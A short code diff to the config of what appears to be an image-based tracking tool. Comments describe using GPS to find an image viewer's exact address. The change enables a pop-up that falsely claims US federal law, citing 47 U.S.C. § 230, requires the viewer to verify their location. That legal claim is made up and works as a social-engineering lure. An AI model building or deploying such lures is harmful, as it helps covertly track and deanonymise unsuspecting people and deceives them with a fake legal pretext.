@@ -27,7 +27,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "Notice: To access this image, you must verify your location in accordance with United States federal law. Under the Communications Decency Act (47 U.S.C. § 230), certain content restrictions apply based on your jurisdiction.", 
         "richMessage": True, # Enable rich text? (See README for more info)
     },
